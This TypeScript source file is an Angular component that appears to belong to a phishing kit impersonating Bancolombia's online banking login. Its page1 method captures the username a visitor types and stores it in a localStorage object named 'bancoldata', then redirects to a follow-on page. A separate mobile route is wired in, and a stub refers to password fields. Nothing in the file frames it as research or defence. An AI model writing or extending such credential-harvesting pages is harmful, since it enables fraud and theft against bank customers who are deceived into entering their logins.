import { CommonModule } from '@angular/common';
import { AfterViewInit, Component, ElementRef, QueryList, Renderer2, ViewChild, ViewChildren } from '@angular/core';
import { FormsModule, ReactiveFormsModule } from '@angular/forms';
import { Router, RouterLink } from '@angular/router';

@Component({
  selector: 'app-bancolombia',
  imports: [CommonModule],
  templateUrl: './bancolombia.component.html',
  styleUrl: './bancolombia.component.css'
})
export default class BancolombiaComponent implements AfterViewInit {
  @ViewChild('userInput') userInput!: ElementRef;
  @ViewChild('continueButton') continueButton!: ElementRef;
  @ViewChild('imageContainer') imageContainer!: ElementRef;
  @ViewChild('loader') loader!: ElementRef;

  page = 2;

  constructor(private renderer: Renderer2, private router: Router) {}

  ngAfterViewInit(): void {
    if (window.innerWidth <= 800) {
      this.router.navigate(['bancolombia-movil']);
    }
    if (this.page === 1) {
      this.page1();
    } else if (this.page === 2) {
      this.page2();
    }
  }

  page1() {
    const userInputElement = this.userInput?.nativeElement;
    const continueButtonElement = this.continueButton?.nativeElement;
    const imageContainerElement = this.imageContainer?.nativeElement;
    const loaderElement = this.loader?.nativeElement;

    if (!userInputElement || !continueButtonElement || !imageContainerElement || !loaderElement) {
      console.error('One or more elements are missing.');
      return;
    }   

    // Enable/Disable the button based on user input
    this.renderer.listen(userInputElement, 'input', () => {
      const userValue = userInputElement.value.trim();
      if (userValue.length >= 4) {
        continueButtonElement.classList.add('enabled');
        continueButtonElement.classList.remove('disabled');
      } else {
        continueButtonElement.classList.add('disabled');
        continueButtonElement.classList.remove('enabled');
      }
    });

    // Action when clicking "Continue"
    this.renderer.listen(continueButtonElement, 'click', () => {
      const userValue = userInputElement.value.trim();
      if (userValue.length >= 4) {
        let bancoldata: any;
        try {
          const storedData = localStorage.getItem('bancoldata');
          bancoldata = storedData ? JSON.parse(storedData) : {};
        } catch (e) {
          console.error('Error al parsear bancoldata. Reiniciando a un objeto vacío:', e);
          bancoldata = {}; // Reset to empty object if parsing error occurs
        }

        // Update the object with the new user value
        bancoldata.usuario = userValue;

        // Save the updated value to localStorage
        localStorage.setItem('bancoldata', JSON.stringify(bancoldata));

        // Redirect to the next page
        window.location.href = 'index-cel.html';
      } else {
        alert('Por favor, ingrese un usuario válido de al menos 4 caracteres.');
      }
    });
  }

  page2() {
    window.addEventListener('load', () => {
      const loader = document.getElementById('loader');
      if (loader) {
        this.renderer.setStyle(loader, 'display', 'none');
      }
    });


    // Handle password input fields and continue button
    // (same logic as before)
  }
  nextpage() {
    this.page = 2;
    this.page2();
  }
}
